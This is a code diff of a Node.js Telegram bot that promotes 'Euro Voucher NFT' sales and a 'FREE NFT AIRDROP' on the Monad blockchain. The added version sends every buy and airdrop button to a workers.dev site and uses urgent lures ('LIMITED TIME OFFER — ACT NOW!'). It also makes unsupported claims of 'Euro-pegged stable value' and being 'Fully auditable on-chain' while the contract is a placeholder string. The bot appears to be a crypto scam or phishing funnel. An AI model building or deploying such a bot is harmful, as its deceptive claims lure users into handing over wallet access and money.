@@ -1,117 +1,204 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 
-const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
+const token = process.env.BOT_TOKEN;
+const WEBSITE = 'https://nftcriptocash.nelutz2you.workers.dev';
+const CONTRACT = 'update_with_real_contract';
 
-const GAME_URL = 'https://voucher.scratchnft.site/';
-const CONTRACT = '0xa4d064E4ac881234961C076d314Abf9ac8d4E4BB';
-const LOGO = 'https://scarlet-central-krill-672.mypinata.cloud/ipfs/bafybeiaho7h7ysvoxmoqvi7rveh2rcls6rh4weagezoi6umctfpgrgkvp4';
-
-const VOUCHERS = [
-  { value: '5€',   price: '100 MON',   img: 'https://files.catbox.moe/mszp1d.jpeg' },
-  { value: '10€',  price: '200 MON',   img: 'https://files.catbox.moe/otcljk.jpeg' },
-  { value: '20€',  price: '300 MON',   img: 'https://files.catbox.moe/c11h9p.jpeg' },
-  { value: '50€',  price: '500 MON',   img: 'https://files.catbox.moe/4jezdg.jpeg' },
-  { value: '100€', price: '1,000 MON', img: 'https://files.catbox.moe/qlf6vq.jpeg' },
-  { value: '500€', price: '5,000 MON', img: 'https://files.catbox.moe/ir84ab.jpeg' },
-];
-
-bot.onText(/\/start/, (msg) => {
-  const name = msg.from.first_name || 'User';
-  bot.sendPhoto(msg.chat.id, LOGO, {
-    caption:
-      `💶 *EURO VOUCHER NFT SYSTEM*\n\n` +
-      `Welcome, ${name}! 🎉\n\n` +
-      `Buy Euro-denominated NFT vouchers on Monad Mainnet!\n\n` +
-      `▸ 5€ → 100 MON\n` +
-      `▸ 10€ → 200 MON\n` +
-      `▸ 20€ → 300 MON\n` +
-      `▸ 50€ → 500 MON\n` +
-      `▸ 100€ → 1,000 MON\n` +
-      `▸ 500€ → 5,000 MON\n\n` +
-      `⛓ Chain: Monad #143`,
-    parse_mode: 'Markdown',
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: '💶 Buy Voucher Now', web_app: { url: GAME_URL } }],
-        [{ text: '💰 Prices', callback_data: 'prices' },
-         { text: '📋 Contract', callback_data: 'contract' }],
-        [{ text: '❓ Help', callback_data: 'help' }]
-      ]
-    }
-  });
-});
-
-bot.onText(/\/buy/, (msg) => {
-  bot.sendPhoto(msg.chat.id, 'https://files.catbox.moe/qlf6vq.jpeg', {
-    caption: '💶 *Buy Euro Voucher NFT*\n\nOpen the app and connect your wallet to purchase!',
-    parse_mode: 'Markdown',
-    reply_markup: { inline_keyboard: [[{ text: '💶 Open Voucher App', web_app: { url: GAME_URL } }]] }
-  });
-});
-
-bot.onText(/\/prices/, (msg) => {
-  let txt = '💰 *VOUCHER PRICES*\n\n';
-  VOUCHERS.forEach(v => { txt += `💶 ${v.value} → *${v.price}*\n`; });
-  txt += `\n⛓ Network: Monad Mainnet #143`;
-  bot.sendPhoto(msg.chat.id, 'https://files.catbox.moe/ir84ab.jpeg', {
-    caption: txt,
-    parse_mode: 'Markdown',
-    reply_markup: { inline_keyboard: [[{ text: '💶 Buy Now', web_app: { url: GAME_URL } }]] }
-  });
-});
-
-bot.onText(/\/contract/, (msg) => {
-  bot.sendMessage(msg.chat.id,
-    `📜 *Smart Contract Info*\n\n` +
-    `▸ Address:\n\`${CONTRACT}\`\n\n` +
-    `▸ Network: Monad Mainnet\n` +
-    `▸ Chain ID: 143\n` +
-    `▸ Standard: ERC-721\n` +
-    `▸ Symbol: EVNFT\n\n` +
-    `🔍 [View on Explorer](https://explorer.monad.xyz/address/${CONTRACT})`,
-    { parse_mode: 'Markdown' }
-  );
-});
-
-bot.onText(/\/help/, (msg) => {
-  bot.sendMessage(msg.chat.id,
-    `❓ *EURO VOUCHER HELP*\n\n` +
-    `💶 /buy — Buy a voucher NFT\n` +
-    `💰 /prices — View all prices\n` +
-    `📜 /contract — Contract info\n\n` +
-    `🌐 App: ${GAME_URL}\n` +
-    `⛓ Chain: Monad #143`,
-    { parse_mode: 'Markdown' }
-  );
-});
-
-bot.on('callback_query', (query) => {
-  const chatId = query.message.chat.id;
-  if (query.data === 'prices') {
-    let txt = '💰 *VOUCHER PRICES*\n\n';
-    VOUCHERS.forEach(v => { txt += `💶 ${v.value} → *${v.price}*\n`; });
-    bot.sendPhoto(chatId, 'https://files.catbox.moe/ir84ab.jpeg', {
-      caption: txt,
-      parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: [[{ text: '💶 Buy Now', web_app: { url: GAME_URL } }]] }
-    });
-  }
-  if (query.data === 'contract') {
-    bot.sendMessage(chatId,
-      `📜 *Contract:*\n\`${CONTRACT}\`\n\n` +
-      `⛓ Monad Mainnet #143\n\n` +
-      `🔍 [View on Explorer](https://explorer.monad.xyz/address/${CONTRACT})`,
-      { parse_mode: 'Markdown' }
-    );
-  }
-  if (query.data === 'help') {
-    bot.sendMessage(chatId,
-      `❓ *Help*\n\n💶 /buy\n💰 /prices\n📜 /contract`,
-      { parse_mode: 'Markdown' }
-    );
-  }
-  bot.answerCallbackQuery(query.id);
-});
+const bot = new TelegramBot(token, { polling: true });
 
 console.log('💶 Euro Voucher Bot is running...');
+
+const mainMenu = {
+  reply_markup: {
+    inline_keyboard: [
+      [{ text: '🚀 BUY NOW — Get Euro Voucher NFT!', url: WEBSITE }],
+      [{ text: '🎁 FREE AIRDROP — Claim Now!', url: WEBSITE }],
+      [{ text: '🎫 View Vouchers', callback_data: 'vouchers' }, { text: '💶 How It Works', callback_data: 'howto' }],
+      [{ text: '📜 Contract', callback_data: 'contract' }, { text: '❓ Help', callback_data: 'help' }],
+      [{ text: '🌐 Open dApp', url: WEBSITE }],
+    ]
+  },
+  parse_mode: 'Markdown'
+};
+
+const WELCOME_BANNER =
+  '🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣🔵🟢\n' +
+  '💶 *EURO CASH NFT VOUCHER SYSTEM* 💶\n' +
+  '🟢🔵🟣🔴🟠🟡🟢🔵🟣🔴🟠🟡\n\n' +
+  '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+  '🔥 *AIRDROP IS LIVE — CLAIM NOW!* 🔥\n' +
+  '━━━━━━━━━━━━━━━━━━━━━━━\n\n' +
+  '💵 *€5* · 💴 *€10* · 💶 *€20* · 💷 *€50*\n' +
+  '💰 *€100* · 💎 *€200* · ⭐ *€500* VOUCHERS\n\n' +
+  '✅ _Decentralized Euro vouchers on Monad_\n' +
+  '🔐 Fully on-chain · Secure · Instant\n' +
+  '⚡ Monad Blockchain Speed\n' +
+  '🎁 *FREE NFT AIRDROP* for early holders!\n\n' +
+  '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+  '👇 *TAP BUY NOW TO GET YOURS!* 👇\n' +
+  '━━━━━━━━━━━━━━━━━━━━━━━';
+
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, WELCOME_BANNER, mainMenu);
+});
+
+bot.onText(/\/vouchers/, (msg) => sendVouchers(msg.chat.id));
+bot.onText(/\/howto/, (msg) => sendHowTo(msg.chat.id));
+bot.onText(/\/contract/, (msg) => sendContract(msg.chat.id));
+bot.onText(/\/airdrop/, (msg) => sendAirdrop(msg.chat.id));
+bot.onText(/\/website/, (msg) => {
+  bot.sendMessage(msg.chat.id, `🌐 Euro Voucher dApp:\n${WEBSITE}`, {
+    reply_markup: { inline_keyboard: [[{ text: '🚀 Open dApp NOW', url: WEBSITE }]] }
+  });
+});
+bot.onText(/\/help/, (msg) => sendHelp(msg.chat.id));
+
+function sendVouchers(chatId) {
+  bot.sendMessage(chatId,
+    '🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣🔵🟢\n' +
+    '🎫 *EURO VOUCHER NFT COLLECTION* 🎫\n' +
+    '🟢🔵🟣🔴🟠🟡🟢🔵🟣🔴🟠🟡\n\n' +
+    '🟢 *€5 Voucher NFT* — Entry · Common 🎟️\n' +
+    '🔵 *€10 Voucher NFT* — Standard · Common 🎟️\n' +
+    '🟡 *€20 Voucher NFT* — Popular · Uncommon 🌟\n' +
+    '🟠 *€50 Voucher NFT* — Premium · Rare 💫\n' +
+    '🔴 *€100 Voucher NFT* — Elite · Epic 🔥\n' +
+    '💜 *€200 Voucher NFT* — Exclusive · Legendary ⚡\n' +
+    '⭐ *€500 Voucher NFT* — Ultra Rare · Mythic 👑\n\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '🎁 *AIRDROP* — Free NFT for early buyers!\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🚀 BUY NOW!', url: WEBSITE }],
+          [{ text: '🎁 CLAIM AIRDROP', url: WEBSITE }],
+          [{ text: '🔙 Back', callback_data: 'menu' }]
+        ]
+      }
+    }
+  );
+}
+
+function sendAirdrop(chatId) {
+  bot.sendMessage(chatId,
+    '🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁\n' +
+    '⚡ *FREE NFT AIRDROP — LIVE NOW!* ⚡\n' +
+    '🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁🎁\n\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '🔥 *HOW TO CLAIM YOUR FREE NFT:*\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n\n' +
+    '*Step 1* 👉 Connect your wallet\n' +
+    '*Step 2* 👉 Buy any Euro Voucher NFT\n' +
+    '*Step 3* 👉 FREE NFT airdropped to you!\n\n' +
+    '💶 Available denominations:\n' +
+    '€5 · €10 · €20 · €50 · €100 · €200 · €500\n\n' +
+    '⏰ *LIMITED TIME OFFER — ACT NOW!*\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🎁 CLAIM FREE AIRDROP NOW!', url: WEBSITE }],
+          [{ text: '🚀 BUY VOUCHER NFT', url: WEBSITE }],
+          [{ text: '🔙 Back', callback_data: 'menu' }]
+        ]
+      }
+    }
+  );
+}
+
+function sendHowTo(chatId) {
+  bot.sendMessage(chatId,
+    '💶🔵🟡🔴💶🔵🟡🔴💶🔵🟡🔴\n' +
+    '💶 *HOW EURO VOUCHER NFT WORKS* 💶\n' +
+    '🔴🟡🔵💶🔴🟡🔵💶🔴🟡🔵💶\n\n' +
+    '*Step 1* ✅ — Connect your wallet\n' +
+    '*Step 2* ✅ — Choose denomination\n' +
+    '€5 · €10 · €20 · €50 · €100 · €200 · €500\n\n' +
+    '*Step 3* ✅ — Purchase the NFT voucher\n' +
+    '*Step 4* ✅ — Receive FREE AIRDROP NFT 🎁\n' +
+    '*Step 5* ✅ — Redeem anytime on-chain\n' +
+    '*Step 6* ✅ — Transfer or trade freely\n\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '🏆 *WHY EURO CASH NFT?*\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '💎 Fully decentralized\n' +
+    '⚡ Instant settlement on Monad\n' +
+    '🔄 Tradeable on NFT markets\n' +
+    '💶 Euro-pegged stable value\n' +
+    '🎁 FREE airdrop for holders!\n',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🚀 BUY NOW!', url: WEBSITE }],
+          [{ text: '🎁 FREE AIRDROP', url: WEBSITE }],
+          [{ text: '🔙 Back', callback_data: 'menu' }]
+        ]
+      }
+    }
+  );
+}
+
+function sendContract(chatId) {
+  bot.sendMessage(chatId,
+    '📜🔐📜🔐📜🔐📜🔐📜🔐📜🔐\n' +
+    '📜 *SMART CONTRACT INFO* 📜\n' +
+    '🔐📜🔐📜🔐📜🔐📜🔐📜🔐📜\n\n' +
+    `🎫 *Euro Voucher NFT ERC-721*\n\`${CONTRACT}\`\n\n` +
+    '⛓ Network: Monad Blockchain\n' +
+    '🔐 Fully auditable on-chain\n' +
+    '💶 Euro-denominated vouchers\n' +
+    '🔄 Transferable & redeemable\n' +
+    '🎁 Airdrop enabled for holders',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🚀 BUY NOW!', url: WEBSITE }],
+          [{ text: '🌐 Website', url: WEBSITE }],
+          [{ text: '🔙 Back', callback_data: 'menu' }]
+        ]
+      }
+    }
+  );
+}
+
+function sendHelp(chatId) {
+  bot.sendMessage(chatId,
+    '❓ *Euro Voucher Bot Commands*\n\n' +
+    '/start — 🏠 Main menu\n' +
+    '/vouchers — 🎫 View all voucher types\n' +
+    '/airdrop — 🎁 Free NFT airdrop info\n' +
+    '/howto — 💶 How it works\n' +
+    '/contract — 📜 Smart contract\n' +
+    '/website — 🌐 Visit the dApp\n' +
+    '/help — ❓ This menu',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🚀 BUY NOW!', url: WEBSITE }],
+          [{ text: '🎁 FREE AIRDROP', url: WEBSITE }],
+        ]
+      }
+    }
+  );
+}
+
+bot.on('callback_query', (q) => {
+  bot.answerCallbackQuery(q.id);
+  const chatId = q.message.chat.id;
+  if (q.data === 'menu') {
+    bot.sendMessage(chatId, WELCOME_BANNER, mainMenu);
+  } else if (q.data === 'vouchers')  sendVouchers(chatId);
+  else if (q.data === 'howto')       sendHowTo(chatId);
+  else if (q.data === 'contract')    sendContract(chatId);
+  else if (q.data === 'airdrop')     sendAirdrop(chatId);
+  else if (q.data === 'help')        sendHelp(chatId);
+});
+
+bot.on('polling_error', (err) => console.error('Polling error:', err.message));
